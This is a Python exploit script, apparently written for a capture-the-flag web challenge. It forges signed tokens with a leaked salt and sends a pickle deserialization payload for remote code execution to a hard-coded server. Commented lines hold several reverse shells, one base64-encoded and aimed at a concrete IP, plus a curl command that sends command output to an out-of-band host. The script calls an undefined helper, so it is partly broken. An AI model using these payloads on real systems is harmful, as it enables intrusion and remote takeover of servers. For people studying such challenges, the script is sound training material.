#/usr/bin/env python
# -*- coding:utf-8 -*-
import requests as req
import base64
import pickle
import cPickle
import json
import jwt
import hashlib
import hmac


URL = 'http://47.96.118.255:23333/'

# <!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
# _Y0uW1llN3verKn0w1t_

SALT = '_Y0uW1llN3verKn0w1t_'


class User(object):
    user_data = ""
    b = True

    def __init__(self, data):
        if isinstance(data, str):
            data = json.loads(data)['data']
            pos = 0
            if data[35] == '"':
                pos = 36
            elif data[36] == '"':
                pos = 37
            self.user_data = pickle.loads(data[pos:-3])
            # print(self.user_data)
        else:
            self.b = False
            self.user_data = pickle.dumps(data).replace('p4', 'p5').replace(
                'p3', 'p4').replace('p2', 'p3').replace('p1', 'p2').replace('p0', 'p1')

    def toList(self):
        return self.user_data

    def __str__(self):
        if self.b:
            return '.toList()'
        else:
            return 'O:4:"User":2:{s:9:"user_data";s:%d:"%s";}' % (len(self.user_data), self.user_data)

    def toJson(self):
        return json.dumps({"data": self.__str__()}, separators=(',', ':'))


def index():
    res = req.get(URL + "index.php")
    if res.status_code == 200:
        print(res.content)
    else:
        print(res.content)


def b64d(sss):
    l = 4 - (len(sss) % 4)
    res = base64.b64decode(sss + "=" * l)
    return res


def b64e(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')


def genToken(name):
    ls = [u'xxx', 'f561aaf6ef0bf14d4208bb46a4ccb3ad']  # , T()]
    _ls = pickle.dumps(ls)
    payload = 'O:4:"User":2:{s:9:"user_data";s:%d:"%s";}' % (
        len(_ls), _ls)
    _header = "eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI1MCJ9"
    _payload = b64e(json.dumps({"data": payload}))
    # print(_payload)
    _sha = sha256(_header + "." + _payload)
    # print('\n')
    # print(_sha)
    res = _header + "." + _payload + "." + _sha
    print("token: \n")
    print([res])
    return res


def create_jwt(kid, data):
    jwt_header = b64e(
        '{"typ":"JWT","alg":"sha256","kid":"%d"}' % kid)
    jwt_payload = b64e('{"data":"%s"}' % data)
    jwt_signature = b64e(hashlib.sha256(
        jwt_header + '.' + jwt_payload + SALT).hexdigest())
    return jwt_header + '.' + jwt_payload + '.' + jwt_signature


class PickleRce(object):

    def __reduce__(self):
        # return (exec, ("import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"))
        # return (exec, (('import
        # socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",7799));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'),))
        # return (eval, (('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",7799));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'),))
        # return (__import__('subprocess').Popen, (('whoami',),))
        # return (eval,
        # (("""exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTE4LjE2My4yMDAuNTUiLCA3Nzk5KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9zLmR1cDIocy5maWxlbm8oKSwgMikKcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkK'))"""),))
        return (__import__('commands').getoutput, (('ls'),))
        # curl http://web4.sglpih.ceye.io/`whoami`


def sha256(msg):
    sha256 = hashlib.sha256()
    sha256.update(msg + SALT)
    res = sha256.hexdigest()
    return res


if __name__ == '__main__':
    ####################################################
    # hint：Alice likes adding salt at the LAST.
    ####################################################
    # eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI1MCJ9.eyJkYXRhIjoiTzo0OlwiVXNlclwiOjI6e3M6OTpcInVzZXJfZGF0YVwiO3M6NTU6XCIobHAxXG5WeHh4XG5wMlxuYVMnZjU2MWFhZjZlZjBiZjE0ZDQyMDhiYjQ2YTRjY2IzYWQnXG5wM1xuYS5cIjt9In0.ZmM2M2JiMGNhMGFjY2NkNGZmMmE1YjMyMjY1YWRmNmFkNmNiOWFlNDY3ZGEyNDY1Mjg3ZTRlYmZlNjI2OWIyZg
    ####################################################
    # token = genToken("vvv")
    # print("\n")
    # testToken(token)
    x1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI1MCJ9"
    x2 = "eyJkYXRhIjoiTzo0OlwiVXNlclwiOjI6e3M6OTpcInVzZXJfZGF0YVwiO3M6NTU6XCIobHAxXG5WeHh4XG5wMlxuYVMnZjU2MWFhZjZlZjBiZjE0ZDQyMDhiYjQ2YTRjY2IzYWQnXG5wM1xuYS5cIjt9In0"
    # x2d = b64d(x2)
    # print(x2d)
    # x2dp = x2d[9:-1]
    # print(x2dp)
    x3 = "ZmM2M2JiMGNhMGFjY2NkNGZmMmE1YjMyMjY1YWRmNmFkNmNiOWFlNDY3ZGEyNDY1Mjg3ZTRlYmZlNjI2OWIyZg"
    # 2f1d5c5f60448d2cc6c1fea1c9926400156f2b865a21a98146e194aa060eaf6
    # print('x3')
    # print(b64d(x3))
    # print('x3d')
    # print(b64d(x3).decode("hex"))
    # x = x1 + "." + x2 + "." + x3
    x = x1 + "." + x2
    print(x)
    print("")
    print(x3)
    print(b64d(x3))
    print("")
    print('sig')
    # sig = sha256(x)  # b64e()
    print(sha256(x).decode("hex"))
    ori_sha = b64e(sha256(x).decode("hex"))
    print(ori_sha)
    print(b64e(sha256s(ori_sha)))
    # print(sig)
    # print(sha256(x.encode("utf-8")))
    # print(sig)
    # print('sha256(x)')
    # print(sha256(x))
    # print('sha256s(sha256(x))')
    # print(sha256s(sha256(x)))
    # print('b64e(sha256(x))')
    # print('b64e(sha256s(sha256(x)))')
    # print(b64e(sha256s(sha256(x))))
    # print('b64e(sha256s(b64e(sha256(x))))')
    # print(b64e(sha256s(b64e(sha256(x)))))
    # print('x', b64e(sha256s(x)))
    ####################################################
    # u = User([u"xxx", 'f561aaf6ef0bf14d4208bb46a4ccb3ad', T()])
    u = User([u"xxx", 'f561aaf6ef0bf14d4208bb46a4ccb3ad'])
    # print(u.toJson())
    _pp = b64e(u.toJson())
    print("")
    print(_pp)
    # for i in range(len(_pp)):
    #     if _pp[i] != sig[1][i]:
    #         print(i, _pp[i], sig[1][i])
    # print(User(b64d(x2)).toList())
